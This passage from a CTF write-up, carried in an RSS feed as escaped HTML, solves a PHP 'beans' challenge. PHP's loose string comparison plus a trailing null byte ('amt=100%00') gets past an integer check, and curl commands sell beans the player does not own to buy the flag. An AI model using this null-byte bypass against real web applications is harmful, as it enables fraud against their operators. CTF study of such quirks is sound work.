+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100a&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In the context of the program, it would assume the comparison would be &lt;code>2&amp;lt;100&lt;/code> which is true in terms of integers. However, if we include a character in the string, it becomes false due to comparing alphabetically when considering both sides as strings! This essentially defines the purpose for the &lt;code>validate_integer&lt;/code> function in an attempt to ensure that string comparisons do not occur.&lt;/p>
+&lt;p>We have now identified a potential bypass for the beans check if we include non-digit characters within the &lt;code>amt&lt;/code> input. While we can&amp;rsquo;t include letters like I have done in the examples, we can include whitespace which may potentially still cause the same behaviour of alphabetical comparisons instead.&lt;/p>
+&lt;h4 id="the-infamous-byte">The Infamous Byte
+&lt;/h4>&lt;p>First we need to look at what characters the trim function will strip to see what are our options. By default the function will strip these characters:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;#34; &amp;#34;: ASCII SP character 0x20, an ordinary space.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;\t&amp;#34;: ASCII HT character 0x09, a tab.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;\n&amp;#34;: ASCII LF character 0x0A, a new line (line feed).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;\r&amp;#34;: ASCII CR character 0x0D, a carriage return.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;\0&amp;#34;: ASCII NUL character 0x00, the NUL-byte.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;\v&amp;#34;: ASCII VT character 0x0B, a vertical tab.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Next, we want to attempt to replicate the behaviour for &lt;code>2&amp;lt;100a&lt;/code> returning false.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100 &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100&lt;/span>&lt;span class="se">\r&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">php&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;100\v&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We observe the null byte has the same behaviour! Therefore, we can bypass the &lt;code>validate_integer&lt;/code> function and cause the alphabetical comparison to buy more beans than we actually have.&lt;/p>
+&lt;h4 id="solving-the-challenge">Solving the Challenge
+&lt;/h4>&lt;p>I will be running the following commands on a local docker instance. To set this up:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-docker" data-lang="docker">&lt;span class="line">&lt;span class="cl">docker build -t beans .&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span>docker run -p 1337:1337 beans&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First, grab a valid PHP session that tracks our beans and money:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SESH_COOKIE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>curl -s -i &lt;span class="s2">&amp;#34;http://localhost:1337&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sed -n &lt;span class="s1">&amp;#39;s/.*\(PHPSESSID=[^;]*\).*/\1/p&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Buy two beans:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -s -b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SESH_COOKIE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:1337/?action=buy&amp;amp;amt=2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hand-drawn mb-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text-xl mb-4&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Your Stash:&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;grid grid-cols-2 gap-4&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Money: $50&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Beans: 2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Sell 100 beans with a null byte in our amount. To include a null byte in the &lt;code>amt&lt;/code> input, we can use url-encoding. If you want to see the HTML output, you will have to use &lt;code>--output -&lt;/code> to indicate that you want to send to stdout:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -s --output - -b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SESH_COOKIE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:1337/?action=sell&amp;amp;amt=100%00&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hand-drawn mb-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text-xl mb-4&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Your Stash:&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;grid grid-cols-2 gap-4&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Money: $2550&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Beans: -98&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Now we can buy the flag:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -s -b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SESH_COOKIE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:1337/?action=flag&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sed -n &lt;span class="s1">&amp;#39;s/.*\(oicc.*\)/\1/p&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">oiccflag{test}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To replicate this on the challenge infrastructure:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SESH_COOKIE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>curl -s -i &lt;span class="s2">&amp;#34;http://challenges.oceaniacc.com:5002&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sed -n &lt;span class="s1">&amp;#39;s/.*\(PHPSESSID=[^;]*\).*/\1/p&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -s -b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SESH_COOKIE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;http://challenges.oceaniacc.com:5002/?action=buy&amp;amp;amt=2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -s --output - -b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$SESH_COOKIE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;http://challenges.oceaniacc.com:5002/?action=sell&amp;amp;amt=100%00&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>Unfortunately, the challenge infrastructure got taken down before I was able to solve this challenge so I don&amp;rsquo;t have the actual flag 😢&lt;/p>&lt;/blockquote>
+&lt;h4 id="post-challenge-thoughts-1">Post Challenge Thoughts
+&lt;/h4>&lt;p>PHP quirks are interesting. I had to ask hashkitten about the string comparison logic because I had no idea why it was doing that originally. I assumed it was just magically removing the 0s in the string for whatever reason.&lt;/p>
+&lt;p>&lt;img src="https://www.solopie.com/images/beans/hashkitten_reply.png"
+loading="lazy"
+alt="Hashkitten Reply"
+>&lt;/p>
+&lt;p>In hindsight, it does seem pretty obvious now. It would be good to explore PHP type juggling and identify what types get casted to what when type juggling occurs and also for different operators. I&amp;rsquo;m also interested to know if any other languages are affected by this and what are the differences in how it handles comparing different types. I know JavaScript is another language that has loose types so may have a blog about it in the future.&lt;/p>
+&lt;h2 id="login-235">login (235)
+&lt;/h2>&lt;h3 id="description-2">Description
+&lt;/h3>&lt;h3 id="attachments-2">Attachments
+&lt;/h3>&lt;h3 id="writeup-2">Writeup
+&lt;/h3></description></item></channel></rss>
